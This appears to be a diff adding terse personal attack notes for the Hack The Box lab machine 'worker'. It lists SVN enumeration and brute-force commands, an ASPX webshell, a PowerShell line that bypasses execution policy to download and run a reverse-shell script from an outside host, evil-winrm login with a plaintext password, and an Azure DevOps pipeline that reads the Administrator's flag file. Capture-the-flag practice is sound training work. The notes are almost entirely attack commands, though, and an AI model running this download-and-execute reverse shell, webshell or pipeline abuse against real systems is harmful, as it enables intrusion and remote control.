@@ -1,0 +1,27 @@
+gobuster dir -u http://worker.htb -w /usr/share/dirb/wordlists/common.txt
+###nothing no port 80
+nmap -sV -p 3690 -script  /usr/share/nmap/scripts/svn-brute.nse --script-args svn-brute.repo=/svn/ worker.htb
+svn list svn://worker.htb
+svn log svn://worker.htb
+svn checkout svn://worker.htb
+svn diff -r1
+svn diff -r2
+http://devops.worker.htb
+webshells
+ll aspx
+cp /usr/share/webshells/aspx/cmdasp.aspx ./
+git clone https://github.com/samratashok/nishang.git
+powershell -exec bypass iex(new-object net.webclient).downloadstring('http://10.10.14.34:8000/Invoke-PowerShellTcp.ps1')
+get-psdrive -psprovider filesystem
+evil-winrm -u robisl -p  wolves11 -i worker.htb
+
+trigger:
+- master
+
+pool: 'Setup'
+
+steps:
+- powershell:  type C:\Users\Administrator\Desktop\root.txt
+  displayName: 'Run a one-line script'
+- powershell:  dir C:\Users\robisl\Desktop\
+  displayName: 'Run a one-line script'
